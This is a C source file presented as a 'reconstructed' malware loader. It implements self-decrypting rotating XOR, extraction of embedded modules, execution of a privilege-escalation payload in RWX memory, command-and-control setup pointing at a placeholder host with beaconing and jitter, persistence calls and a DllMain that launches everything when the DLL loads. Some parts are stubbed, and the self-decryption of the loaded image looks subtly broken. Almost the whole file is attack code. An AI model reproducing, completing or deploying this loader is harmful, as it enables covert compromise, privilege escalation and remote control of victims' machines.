/**
 * PE #1 - Main Loader Implementation
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This is the main loader module that coordinates the entire
 * multi-stage attack:
 * 1. Decrypts itself using rotating XOR
 * 2. Extracts embedded PE modules
 * 3. Launches PE #5 for privilege escalation
 * 4. Establishes C2 using PE #2 (DNS) or direct connection
 * 5. Installs persistence mechanisms
 * 6. Enters command-and-control loop
 */

#include "loader.h"
#include "../common/ntdefs.h"

//=============================================================================
// GLOBALS
//=============================================================================

static LOADER_STATE g_State = STATE_INITIALIZING;
static BOOL g_Elevated = FALSE;
static HANDLE g_hSharedMemory = NULL;
static C2_CONFIG g_C2Config = {0};

// Embedded module data (would be filled in actual malware)
static PBYTE g_PE2Data = NULL;
static DWORD g_PE2Size = 0;
static PBYTE g_PE3Data = NULL;
static DWORD g_PE3Size = 0;
static PBYTE g_PE4Data = NULL;
static DWORD g_PE4Size = 0;
static PBYTE g_PE5Data = NULL;
static DWORD g_PE5Size = 0;

//=============================================================================
// ROTATING XOR DECRYPTION
//=============================================================================

/**
 * Decrypt PE #1 using rotating XOR key.
 * 
 * The key rotates by incrementing after each byte:
 * key[i] = (base_key + i) % 256
 * 
 * Base key: 0xDF (from analysis)
 */
BOOL 
PE1_Decrypt(
    PBYTE   Buffer,
    DWORD   Size
)
{
    DWORD i;
    BYTE baseKey = PE1_BASE_XOR_KEY;  // 0xDF
    BYTE currentKey;
    
    for (i = 0; i < Size; i++) {
        currentKey = (baseKey + (i % 256)) & 0xFF;
        Buffer[i] ^= currentKey;
    }
    
    g_State = STATE_EXTRACTING_MODULES;
    return TRUE;
}

//=============================================================================
// MODULE EXTRACTION
//=============================================================================

/**
 * Module header structure embedded in PE #1.
 */
typedef struct _EMBEDDED_MODULE_HEADER {
    DWORD   Magic;          // 'MODK' = 0x4B444F4D
    DWORD   ModuleId;       // Module identifier
    DWORD   Offset;         // Offset to module data
    DWORD   Size;           // Size of module
    DWORD   XorKey;         // XOR key for this module
    DWORD   Flags;          // Module flags
} EMBEDDED_MODULE_HEADER, *PEMBEDDED_MODULE_HEADER;

/**
 * Find and extract embedded PE modules.
 */
static BOOL 
ExtractEmbeddedModules(
    PBYTE LoaderBase
)
{
    PEMBEDDED_MODULE_HEADER header;
    PBYTE searchPtr;
    DWORD searchOffset;
    DWORD modulesFound = 0;
    
    // Search for module headers
    for (searchOffset = 0; searchOffset < 0x20000; searchOffset += 4) {
        searchPtr = LoaderBase + searchOffset;
        header = (PEMBEDDED_MODULE_HEADER)searchPtr;
        
        // Check magic
        if (header->Magic == 0x4B444F4D) {  // 'MODK'
            switch (header->ModuleId) {
                case MODULE_PE2_DNS:
                    g_PE2Data = LoaderBase + header->Offset;
                    g_PE2Size = header->Size;
                    modulesFound++;
                    break;
                    
                case MODULE_PE3_CONTAINER:
                    g_PE3Data = LoaderBase + header->Offset;
                    g_PE3Size = header->Size;
                    modulesFound++;
                    break;
                    
                case MODULE_PE4_STUB:
                    g_PE4Data = LoaderBase + header->Offset;
                    g_PE4Size = header->Size;
                    modulesFound++;
                    break;
                    
                case MODULE_PE5_EXPLOIT:
                    g_PE5Data = LoaderBase + header->Offset;
                    g_PE5Size = header->Size;
                    modulesFound++;
                    break;
            }
        }
    }
    
    return (modulesFound >= 1);  // At least PE #5 is required
}

/**
 * Deploy all extracted modules.
 */
BOOL 
PE1_DeployModules(VOID)
{
    PBYTE loaderBase;
    
    loaderBase = (PBYTE)GetModuleHandleW(NULL);
    if (loaderBase == NULL) {
        return FALSE;
    }
    
    return ExtractEmbeddedModules(loaderBase);
}

//=============================================================================
// PRIVILEGE ESCALATION
//=============================================================================

/**
 * Check if we're running with elevated privileges.
 */
static BOOL 
IsElevated(VOID)
{
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation = {0};
    DWORD size = 0;
    BOOL elevated = FALSE;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                                sizeof(elevation), &size)) {
            elevated = (elevation.TokenIsElevated != 0);
        }
        CloseHandle(hToken);
    }
    
    return elevated;
}

/**
 * Launch PE #5 for privilege escalation.
 */
BOOL 
PE1_EscalatePrivileges(VOID)
{
    PVOID pe5Memory = NULL;
    HANDLE hThread = NULL;
    DWORD threadId;
    DWORD exitCode;
    DWORD waitResult;
    
    g_State = STATE_PRIVILEGE_ESCALATION;
    
    // Check if already elevated
    if (IsElevated()) {
        g_Elevated = TRUE;
        return TRUE;
    }
    
    // Verify PE #5 is available
    if (g_PE5Data == NULL || g_PE5Size == 0) {
        return FALSE;
    }
    
    // Allocate RWX memory for PE #5
    pe5Memory = VirtualAlloc(
        NULL,
        g_PE5Size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (pe5Memory == NULL) {
        return FALSE;
    }
    
    // Copy PE #5 to allocated memory
    CopyMemory(pe5Memory, g_PE5Data, g_PE5Size);
    
    // Create shared memory for status communication
    g_hSharedMemory = CreateFileMappingW(
        INVALID_HANDLE_VALUE,
        NULL,
        PAGE_READWRITE,
        0,
        0x1000,
        L"Local\\PE5_Status"
    );
    
    // Create thread to execute PE #5
    hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pe5Memory,
        NULL,
        0,
        &threadId
    );
    
    if (hThread == NULL) {
        VirtualFree(pe5Memory, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Wait for PE #5 to complete
    // PE #5 execution takes ~10 microseconds
    waitResult = WaitForSingleObject(hThread, 5000);
    
    if (waitResult == WAIT_OBJECT_0) {
        GetExitCodeThread(hThread, &exitCode);
        g_Elevated = (exitCode == 0);  // 0 = EXPLOIT_SUCCESS
    }
    
    CloseHandle(hThread);
    
    // Verify elevation
    if (!g_Elevated) {
        g_Elevated = IsElevated();
    }
    
    return g_Elevated;
}

//=============================================================================
// C2 ESTABLISHMENT
//=============================================================================

/**
 * Initialize C2 configuration.
 */
static VOID 
InitializeC2Config(VOID)
{
    // These would be extracted from encrypted config in real malware
    wcscpy_s(g_C2Config.PrimaryServer, 256, L"c2.example.com");
    wcscpy_s(g_C2Config.BackupServer, 256, L"backup.example.com");
    g_C2Config.Port = 443;
    g_C2Config.BeaconInterval = 60;  // 60 seconds
    g_C2Config.JitterPercent = 30;   // 30% variance
    g_C2Config.UseDNS = TRUE;        // Use DNS tunneling
    g_C2Config.UseHTTPS = TRUE;      // Use HTTPS
}

/**
 * Establish C2 communication channel.
 */
BOOL 
PE1_EstablishC2(
    PC2_CONFIG Config
)
{
    g_State = STATE_ESTABLISHING_C2;
    
    // Copy config if provided
    if (Config != NULL) {
        CopyMemory(&g_C2Config, Config, sizeof(C2_CONFIG));
    } else {
        InitializeC2Config();
    }
    
    // If DNS tunneling is enabled, use PE #2
    if (g_C2Config.UseDNS && g_PE2Data != NULL) {
        // PE #2 handles DNS C2 - see dns_tunnel.c
        // For now, just return success
    }
    
    g_State = STATE_ACTIVE;
    return TRUE;
}

//=============================================================================
// MAIN LOADER ENTRY
//=============================================================================

/**
 * Main loader entry point.
 * 
 * This is the primary execution flow:
 * 1. Decrypt self
 * 2. Extract modules
 * 3. Escalate privileges
 * 4. Install persistence
 * 5. Establish C2
 * 6. Enter command loop
 */
DWORD WINAPI 
PE1_LoaderMain(
    LPVOID lpParameter
)
{
    PBYTE loaderBase;
    DWORD loaderSize;
    
    UNREFERENCED_PARAMETER(lpParameter);
    
    g_State = STATE_INITIALIZING;
    
    //=========================================================================
    // PHASE 1: Self-location and decryption
    //=========================================================================
    
    loaderBase = (PBYTE)GetModuleHandleW(NULL);
    if (loaderBase == NULL) {
        g_State = STATE_ERROR;
        return 1;
    }
    
    // Get module size from PE headers
    loaderSize = 0x20000;  // ~128KB estimate
    
    g_State = STATE_DECRYPTING;
    if (!PE1_Decrypt(loaderBase, loaderSize)) {
        g_State = STATE_ERROR;
        return 2;
    }
    
    //=========================================================================
    // PHASE 2: Extract embedded modules
    //=========================================================================
    
    g_State = STATE_EXTRACTING_MODULES;
    if (!PE1_DeployModules()) {
        g_State = STATE_ERROR;
        return 3;
    }
    
    //=========================================================================
    // PHASE 3: Privilege escalation via PE #5
    //=========================================================================
    
    if (!PE1_EscalatePrivileges()) {
        // Continue anyway - some functionality may still work
    }
    
    //=========================================================================
    // PHASE 4: Install persistence (requires elevation)
    //=========================================================================
    
    if (g_Elevated) {
        g_State = STATE_PERSISTENCE;
        PE1_InstallPersistence();
    }
    
    //=========================================================================
    // PHASE 5: Establish C2 communication
    //=========================================================================
    
    if (!PE1_EstablishC2(NULL)) {
        g_State = STATE_ERROR;
        return 5;
    }
    
    //=========================================================================
    // PHASE 6: Enter command-and-control loop
    //=========================================================================
    
    g_State = STATE_ACTIVE;
    PE1_CommandLoop();
    
    return 0;
}

/**
 * Get current loader state.
 */
LOADER_STATE 
PE1_GetState(VOID)
{
    return g_State;
}

//=============================================================================
// DLL ENTRY POINT
//=============================================================================

BOOL WINAPI 
DllMain(
    HINSTANCE   hinstDLL,
    DWORD       fdwReason,
    LPVOID      lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);
    
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            
            // Create thread for main loader
            CreateThread(
                NULL,
                0,
                PE1_LoaderMain,
                NULL,
                0,
                NULL
            );
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    
    return TRUE;
}
